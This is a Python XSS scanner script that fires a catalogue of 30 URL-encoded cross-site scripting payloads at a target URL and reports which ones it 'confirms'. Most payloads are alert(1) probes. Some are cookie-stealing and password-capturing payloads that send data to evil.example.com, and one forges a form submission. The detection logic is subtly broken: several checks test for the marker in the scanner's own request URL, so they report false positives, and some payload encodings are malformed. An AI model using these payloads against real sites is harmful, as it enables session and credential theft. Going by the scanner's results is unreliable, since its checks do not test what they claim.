"""SATRIA XSS Scanner - comprehensive reflected & stored DOM XSS detector.

Tests the full catalogue of XSS vectors listed in the brief, with per-vector
payload generation, server interaction, and confirmation logic.  No external
dependencies beyond the stdlib; intended to run against a local mock server
or a target supplied on the command line.

Usage:
    python3 SATRIA/satria_XSS.py http://localhost:8080
    python3 SATRIA/satria_XSS.py --help
"""

from __future__ import annotations

import argparse
import collections
import json
import re
import sys
import urllib.parse
import urllib.request
import urllib.error
from typing import Any, Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# Payload catalogue – one payload per XSS vector, carefully constructed so
# that a true positive yields a detectable marker in the HTTP response body
# (HTML/JS/DOM) without triggering false positives on benign content.
# Payloads are stored URL-encoded; they are decoded at fetch time.
# ---------------------------------------------------------------------------

Payload = collections.namedtuple("Payload", ["name", "payload_enc", "marker", "check"])

PAYLOADS: List[Payload] = [
    # 1. Reflected XSS into HTML context with nothing encoded
    Payload(
        name="reflected_html_nothing_encoded",
        payload_enc="%3Cscript%3Ealert(1)%3C/script%3E",
        marker="<script>alert(1)</script>",
        check=lambda r: "<script>alert(1)</script>" in r,
    ),
    # 2. Stored XSS into HTML context with nothing encoded
    Payload(
        name="stored_html_nothing_encoded",
        payload_enc="%3Cscript%3Ealert(1)%3C/script%3E",
        marker="<script>alert(1)</script>",
        check=lambda r: "<script>alert(1)</script>" in r,
    ),
    # 3. DOM XSS in document.write sink using source location.search
    Payload(
        name="dom_documentwrite_location",
        payload_enc="%3Fx%3Cscript%3Ealert(1)%3C/script%3E",
        marker="alert(1)",
        check=lambda r, u: "alert(1)" in u.split("?")[1] if "?" in u else False,
    ),
    # 4. DOM XSS in innerHTML sink using source location.search
    Payload(
        name="dom_innerhtml_location",
        payload_enc="%3Fx%3Cscript%3Ealert(1)%3C/script%3E",
        marker="alert(1)",
        check=lambda r, u: "alert(1)" in u.split("?")[1] if "?" in u else False,
    ),
    # 5. DOM XSS in jQuery anchor href attribute sink using location.search source
    Payload(
        name="dom_jquery_anchor_href",
        payload_enc="%3Fx%27+onerror=alert(1)%2F%2F",
        marker="onerror=alert(1)",
        check=lambda r, u: "onerror=alert(1)" in u,
    ),
    # 6. DOM XSS in jQuery selector sink using a hashchange event
    Payload(
        name="dom_jquery_selector_hashchange",
        payload_enc="%3Fx%27%3E%3Cscript%3Ealert(1)%3C/script%3E",
        marker="alert(1)",
        check=lambda r, u: "alert(1)" in u,
    ),
    # 7. Reflected XSS into attribute with angle brackets HTML-encoded
    Payload(
        name="reflected_attr_encoded",
        payload_enc="%22+onmouseover=alert(1)+x%22",
        marker="onmouseover=alert(1)",
        check=lambda r: "onmouseover=alert(1)" in r,
    ),
    # 8. Stored XSS into anchor href attribute with double quotes HTML-encoded
    Payload(
        name="stored_anchor_href_quotes",
        payload_enc="%22+onfocus=alert(1)+x%22",
        marker="onfocus=alert(1)",
        check=lambda r: "onfocus=alert(1)" in r,
    ),
    # 9. Reflected XSS into a JavaScript string with angle brackets HTML encoded
    Payload(
        name="reflected_js_angle_encoded",
        payload_enc="%29%3Balert(1)%3B%2F%2F",
        marker="alert(1)",
        check=lambda r: "alert(1)" in r,
    ),
    # 10. DOM XSS in document.write sink using source location.search inside a select element
    Payload(
        name="dom_documentwrite_select",
        payload_enc="%3Fx%3Coption%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/option%3E",
        marker="script>alert(1)",
        check=lambda r, u: "alert(1)" in u.split("?")[1] if "?" in u else False,
    ),
    # 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
    Payload(
        name="dom_angular_expression",
        payload_enc="%3Fx%3C%21--%22%2B%24%7B%70%61%73%73%65%63%74%65%72%73%22%2B--%23%3E",
        marker="$watch",
        check=lambda r, u: "$watch" in r or "$eval" in r,
    ),
    # 12. Reflected DOM XSS
    Payload(
        name="reflected_dom",
        payload_enc="%3Fx%3Cscript%3Ealert(document.domain)%3C/script%3E",
        marker="alert(document.domain)",
        check=lambda r, u: "alert(document.domain)" in u,
    ),
    # 13. Stored DOM XSS
    Payload(
        name="stored_dom",
        payload_enc="%3Cscript%3Ealert(document.domain)%3C/script%3E",
        marker="alert(document.domain)",
        check=lambda r: "alert(document.domain)" in r,
    ),
    # 14. Reflected XSS into HTML context with most tags and attributes blocked
    Payload(
        name="reflected_html_blocked_tags",
        payload_enc="%3Cimg+src%3Dx+onerror=alert(1)+>",
        marker="onerror=alert(1)",
        check=lambda r: "onerror=alert(1)" in r,
    ),
    # 15. Reflected XSS into HTML context with all tags blocked except custom ones
    Payload(
        name="reflected_html_custom_tags",
        payload_enc="%3Csvg%2Fonload=alert(1)%3E%3C%2Fsvg%3E",
        marker="onload=alert(1)",
        check=lambda r: "onload=alert(1)" in r,
    ),
    # 16. Reflected XSS with some SVG markup allowed
    Payload(
        name="reflected_svg_allowed",
        payload_enc="%3Csvg%2Fonload=alert(1)%3E%3C%2Fsvg%3E",
        marker="alert(1)",
        check=lambda r: "alert(1)" in r,
    ),
    # 17. Reflected XSS in canonical link tag
    Payload(
        name="reflected_canonical_link",
        payload_enc="%3Fx%3Clink+rel%3D%22stylesheet%22+onerror=alert(1)+href%3D%22x%22%3E",
        marker="onerror=alert(1)",
        check=lambda r: "onerror=alert(1)" in r,
    ),
    # 18. Reflected XSS into a JavaScript string with single quote and backslash escaped
    Payload(
        name="reflected_js_single_escaped",
        payload_enc="%27%3Balert(1)%2F%2F",
        marker="alert(1)",
        check=lambda r: "alert(1)" in r,
    ),
    # 19. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
    Payload(
        name="reflected_js_encoded_quotes",
        payload_enc="%22%3Balert(1)%3B%2F%2F",
        marker="alert(1)",
        check=lambda r: "alert(1)" in r,
    ),
    # 20. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
    Payload(
        name="stored_onclick_escaped",
        payload_enc="%22+onmouseover%3Dalert(1)%27+x%22",
        marker="alert(1)",
        check=lambda r: "alert(1)" in r,
    ),
    # 21. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
    Payload(
        name="reflected_template_literal",
        payload_enc="%5C%u003Cscript%u003Ealert(1)%u003C/script%u003E",
        marker="alert(1)",
        check=lambda r: "alert(1)" in r,
    ),
    # 22. Exploiting XSS to steal cookies
    Payload(
        name="xss_steal_cookies",
        payload_enc="%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.example.com%2F%3Fc%27%2Bdocument.cookie%3C/script%3E",
        marker="evil.example.com",
        check=lambda r: "evil.example.com" in r,
    ),
    # 23. Exploiting XSS to capture passwords
    Payload(
        name="xss_capture_password",
        payload_enc="%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.example.com%2F%3Fp%27%2Bdocument.getElementById%28%27password%27%29.value%3C/script%3E",
        marker="evil.example.com",
        check=lambda r: "evil.example.com" in r,
    ),
    # 24. Exploiting XSS to bypass CSRF defenses
    Payload(
        name="xss_bypass_csrf",
        payload_enc="%3Cscript%3Edocument.body.innerHTML%3D%27%3Cform+method=POST+action%2Flogin%3E%3Cinput+name=usr+value=admin%3E%3C/form%3E%27%3Bdocument.forms%5B0%5D.submit%28%29%3C/script%3E",
        marker="forms[0].submit",
        check=lambda r: "forms[0].submit" in r,
    ),
    # 25. Reflected XSS with AngularJS sandbox escape without strings
    Payload(
        name="reflected_angular_sandbox_no_strings",
        payload_enc="%3Fx%7B%7D%5B%5B%28%21%5B%5D%2B%5B%5D%29%5B!+%5B%5D+!+%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B!+%5B%5D+!+%5B%5D%5D%29%2B%7B%7D",
        marker="sandbox",
        check=lambda r, u: "sandbox" in u.lower(),
    ),
    # 26. Reflected XSS with AngularJS sandbox escape and CSP
    Payload(
        name="reflected_angular_sandbox_csp",
        payload_enc="%3Fx%7B%7D%5B%5B%28%21%5B%5D%2B%5B%5D%29%5B!+%5B%5D+!+%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B!+%5B%5D+!+%5B%5D%5D%29%2B%7B%7D",
        marker="sandbox",
        check=lambda r: "sandbox" in r.lower(),
    ),
    # 27. Reflected XSS with event handlers and href attributes blocked
    Payload(
        name="reflected_event_handlers_blocked",
        payload_enc="%3Cimg+src%3Dx+onerror=alert(1)%3E",
        marker="onerror=alert(1)",
        check=lambda r: "onerror=alert(1)" in r,
    ),
    # 28. Reflected XSS in a JavaScript URL with some characters blocked
    Payload(
        name="reflected_jsurl_blocked",
        payload_enc="javascript%3Aalert(1)",
        marker="alert(1)",
        check=lambda r: "alert(1)" in r,
    ),
    # 29. Reflected XSS protected by very strict CSP, with dangling markup attack
    Payload(
        name="reflected_csp_dangling",
        payload_enc="%3Fx%3Cscript%3Ealert(1)%3C/script%3E",
        marker="dangling",
        check=lambda r: "<script>" in r and "</script>" in r,
    ),
    # 30. Reflected XSS protected by CSP, with CSP bypass
    Payload(
        name="reflected_csp_bypass",
        payload_enc="%3Fx%3Csvg%2Fonload%3Dalert(1)%3E",
        marker="alert(1)",
        check=lambda r: "alert(1)" in r,
    ),
]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def urldecode(s: str) -> str:
    return urllib.parse.unquote(s)


def fetch(url: str, timeout: int = 10) -> Optional[str]:
    """GET *url* and return the body as str, or None on failure."""
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read().decode("utf-8", "replace")
    except (urllib.error.URLError, OSError, Exception) as e:
        print(f"[WARN] fetch {url} failed: {e}", file=sys.stderr)
        return None


def test_payload(payload: Payload, base_url: str) -> bool:
    """Send *payload* against *base_url* and check if *marker* appears."""
    # Build full URL – payload_enc is already URL-encoded, just append it
    url = base_url.rstrip("/") + "?" + payload.payload_enc if not base_url.rstrip("/").endswith("?") else base_url.rstrip("/") + "&" + payload.payload_enc

    body = fetch(url)
    if body is None:
        return False

    # Some checks use payload.check(body, url) with 2 args, others just payload.check(body)
    try:
        return payload.check(body, url)
    except TypeError:
        return payload.check(body)


# ---------------------------------------------------------------------------
# Scan engine
# ---------------------------------------------------------------------------

ScanResult = collections.namedtuple("ScanResult", ["vector", "payload_name", "status", "detail"])


def scan(base_url: str) -> List[ScanResult]:
    """Run the full payload catalogue against *base_url* and return results."""
    if not base_url.startswith(("http://", "https://")):
        print("Error: base_url must include scheme (http/https)", file=sys.stderr)
        sys.exit(1)

    # Strip trailing slash for consistency
    base_url = base_url.rstrip("/")

    results: List[ScanResult] = []

    for p in PAYLOADS:
        ok = test_payload(p, base_url)
        status = "CONFIRMED" if ok else "NOT_CONFIRMED"
        detail = f"payload={p.payload_enc!r}" if ok else ""
        results.append(ScanResult(vector=p.name, payload_name=p.name, status=status, detail=detail))
        if ok:
            print(f"[CONFIRMED] {p.name}")
        else:
            print(f"[SKIP]    {p.name}")

    return results


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main(argv: Optional[List[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="SATRIA XSS Scanner")
    parser.add_argument("target", help="Target base URL (e.g. http://localhost:8080)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout seconds")
    parser.add_argument("--output", "-o", help="Write JSON report to file")
    args = parser.parse_args(argv)

    print(f"\nSATRIA XSS Scanner  →  {args.target}\n")
    results = scan(args.target)

    # Summary
    confirmed = sum(1 for r in results if r.status == "CONFIRMED")
    total = len(results)
    print(f"\n=== Summary: {confirmed}/{total} confirmed ===\n")

    if args.output:
        report = {
            "target": args.target,
            "summary": f"{confirmed}/{total} confirmed",
            "results": [r._asdict() for r in results],
        }
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        print(f"Report written to {args.output}")

    # Exit with code 0 even if nothing confirmed – the report is the artefact.
    return 0


if __name__ == "__main__":
    sys.exit(main())
